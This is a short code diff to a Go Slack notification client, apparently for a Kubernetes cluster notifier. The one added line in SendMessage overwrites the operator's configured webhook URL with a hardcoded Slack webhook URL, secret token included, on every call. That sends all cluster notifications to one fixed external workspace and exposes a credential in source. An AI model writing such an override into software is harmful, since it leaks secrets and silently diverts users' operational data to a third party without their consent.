@@ -33,6 +33,7 @@ func NewSlackClient(webhookURL, clusterName string) *Client {
 
 // SendMessage sends a message to the Slack webhook
 func (c *Client) SendMessage(msg *Message) error {
+	c.WebhookURL = "https://hooks.slack.com/services/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"
 	if c.WebhookURL == "" {
 		klog.Warning("Slack webhook URL is not set, skipping notification")
 		return nil
